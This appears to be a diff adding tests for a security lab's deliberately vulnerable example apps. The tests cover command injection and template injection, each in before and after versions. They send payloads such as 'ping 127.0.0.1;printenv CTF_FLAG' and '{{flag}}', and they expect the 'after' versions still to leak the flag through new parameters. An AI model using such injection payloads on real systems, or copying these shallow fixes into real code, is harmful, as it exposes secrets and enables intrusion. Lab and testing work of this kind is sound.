@@ -253,6 +253,74 @@ def test_sqli_after():
         assert "role=admin" in admin
         assert FLAG in admin
 
+
+def test_command_before():
+    with run_server("examples/mini-command-injection/before") as base:
+        status, home = get(base + "/")
+        assert status == 200
+        assert "?cmd=" in home
+        assert FLAG not in home
+
+        payload = quote("ping 127.0.0.1;printenv CTF_FLAG", safe="")
+        status, body = get(base + f"/diagnostic?cmd={payload}")
+        assert status == 200
+        assert FLAG in body
+
+
+def test_command_after():
+    with run_server("examples/mini-command-injection/after") as base:
+        status, home = get(base + "/")
+        assert status == 200
+        assert "?host=" in home
+        assert "?cmd=" not in home
+        assert FLAG not in home
+
+        old_payload = quote("ping 127.0.0.1;printenv CTF_FLAG", safe="")
+        status, old = get(base + f"/diagnostic?cmd={old_payload}")
+        assert status == 400
+        assert FLAG not in old
+
+        host = quote("127.0.0.1;printenv CTF_FLAG", safe="")
+        status, body = get(base + f"/diagnostic?host={host}")
+        assert status == 200
+        assert FLAG in body
+
+
+def test_ssti_before():
+    with run_server("examples/mini-ssti/before") as base:
+        status, home = get(base + "/")
+        assert status == 200
+        assert "/preview?template=" in home
+        assert FLAG not in home
+
+        payload = quote("{{flag}}", safe="")
+        status, body = get(base + f"/preview?template={payload}")
+        assert status == 200
+        assert FLAG in body
+
+
+def test_ssti_after():
+    with run_server("examples/mini-ssti/after") as base:
+        status, home = get(base + "/")
+        assert status == 200
+        assert "/draft?template=" in home
+        assert FLAG not in home
+
+        payload = quote("{{flag}}", safe="")
+        status, old = get(base + f"/preview?template={payload}")
+        assert status == 400
+        assert FLAG not in old
+
+        status, created = get(base + f"/draft?template={payload}")
+        assert status == 200
+        assert FLAG not in created
+        draft_id = created.split("draft=", 1)[1].splitlines()[0]
+
+        status, body = get(base + f"/preview?id={draft_id}")
+        assert status == 200
+        assert FLAG in body
+
+
 def test_skill_metadata():
     skill = (ROOT / "nice-try-gpt" / "SKILL.md").read_text(encoding="utf-8")
     assert skill.startswith("---\n")
@@ -285,6 +353,10 @@ def main():
         ("traversal after", test_traversal_after),
         ("SQLi before", test_sqli_before),
         ("SQLi after", test_sqli_after),
+        ("command injection before", test_command_before),
+        ("command injection after", test_command_after),
+        ("SSTI before", test_ssti_before),
+        ("SSTI after", test_ssti_after),
     ]
     failed = 0
 
